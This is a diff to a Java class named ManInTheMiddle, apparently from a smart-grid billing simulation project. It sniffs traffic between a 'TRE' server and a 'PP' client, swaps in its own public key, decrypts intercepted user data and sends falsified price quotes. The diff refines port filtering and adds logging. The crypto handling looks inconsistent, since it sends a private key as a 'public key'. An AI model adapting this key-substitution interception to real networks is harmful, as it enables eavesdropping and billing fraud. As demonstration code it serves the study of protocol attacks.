@@ -10,7 +10,13 @@ import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.codec.binary.Base64;
 import org.pcap4j.packet.Packet;
 
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import java.io.UnsupportedEncodingException;
+import java.security.InvalidKeyException;
 import java.security.KeyPair;
+import java.security.NoSuchAlgorithmException;
 import java.util.Map;
 
 import static SmartGridBillingSenario.utils.Utils.buildKeyPair;
@@ -26,6 +32,7 @@ public class ManInTheMiddle extends Pcap4j {
     private String host;
     private int trePort;
     private int ppPort;
+    private int thisPort;
 
     private MiddleManClient middleManClientToPp;
     private MiddleManClient middleManClientToTre;
@@ -40,34 +47,34 @@ public class ManInTheMiddle extends Pcap4j {
         super(host);
         this.host = host;
         this.trePort = serverPort;
-
+        thisPort = 0;
         //create own KeyPair...
         keyPair = buildKeyPair();
-        super.startCapture();
     }
 
     private class MiddleManClient extends SocketClient {
 
         public MiddleManClient(String host, int port) {
             super(host, port);
+            thisPort = clientPort;
         }
     }
 
     @Override
     public void handleTcpData(String srcAddr, String dstAddr, String srcPort, String dstPort, Packet payload) {
         // from TRE to PP
-        if (srcPort.equals(trePort)) {
+        if (Integer.valueOf(srcPort) == trePort && Integer.valueOf(dstPort) != thisPort) {
             byte[] tcpRawData = payload.getRawData();
             if (tcpRawData.length > 4) {
                 String value = getTcpValue(tcpRawData);
-                log.info("Package Aquired, value: {}", value);
+                log.info("Package Aquired for PP, value: {}", value);
                 try {
                     Message message = Utils.stringToMessage(value);
 
-                    //get Public Key from TRE, replace with own publicc key
-                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_GET_PRICE)) {
+                    //get Public Key from TRE, replace with own public key
+                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST)) {
                         publicKeyFromTre = String.valueOf(message.getObject());
-                        log.info("HAHA!! Get PublicKey from TRE {}, can start Replace Attack", publicKeyFromTre);
+                        log.info("HAHA!! Get PublicKey from TRE {}, replace with Own public Key", publicKeyFromTre);
                         ppPort = Integer.valueOf(dstPort);
                         sendOwnPublicKeyToPp();
                     }
@@ -87,16 +94,16 @@ public class ManInTheMiddle extends Pcap4j {
                 }
             }
             //from PP to TRE
-        } else {
+        } else if (Integer.valueOf(dstPort) == trePort && Integer.valueOf(srcPort) != thisPort) {
             byte[] tcpRawData = payload.getRawData();
             if (tcpRawData.length > 4) {
                 String value = getTcpValue(tcpRawData);
-                log.info("Package Aquired, value: {}", value);
+                log.info("Package Aquired for TRE, value: {}", value);
                 try {
                     Message message = Utils.stringToMessage(value);
 
                     //get encrypte value from PP use it own private key to resolve it
-                    if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_GET_PRICE)) {
+                    if (message.getMessageType().equals(MessageType.GET_PRICE)) {
                         String user = decryptKey(String.valueOf(message.getObject()));
                         log.info("HAHA!! Get USER from PP {}, can send this user to TRE to get response", user);
                         sendEncryptedUserToTre(user);
@@ -110,8 +117,8 @@ public class ManInTheMiddle extends Pcap4j {
 
     }
 
-    private String decryptKey(String value) {
-        return Utils.decrypt(value, keyPair.getPrivate().getEncoded());
+    private String decryptKey(String value) throws BadPaddingException, UnsupportedEncodingException, IllegalBlockSizeException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
+        return Utils.decrypt(value, keyPair.getPublic().getEncoded());
     }
 
     private void sendWrongValueToPp(String receivedQuote) {
@@ -121,6 +128,7 @@ public class ManInTheMiddle extends Pcap4j {
 
         Message message = new Message(MessageType.RESPONSE_FROM_TRE_GET_PRICE, new QuoteAndRateResponseMessage(receivedQuote, wrongValueToPp));
         try {
+            log.info("Send own value to PP {}", message);
             middleManClientToPp.sendToPort(Utils.messageToString(message));
         } catch (JsonProcessingException e) {
             log.error("Cannot send Message!! {}", e);
@@ -136,6 +144,7 @@ public class ManInTheMiddle extends Pcap4j {
         String publicKey = Base64.encodeBase64String(keyPair.getPrivate().getEncoded());
         Message message = new Message(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST, publicKey);
         try {
+            log.info("Send own public key to PP {}", message);
             middleManClientToPp.sendToPort(Utils.messageToString(message));
         } catch (JsonProcessingException e) {
             log.error("Cannot send Message!! {}", e);
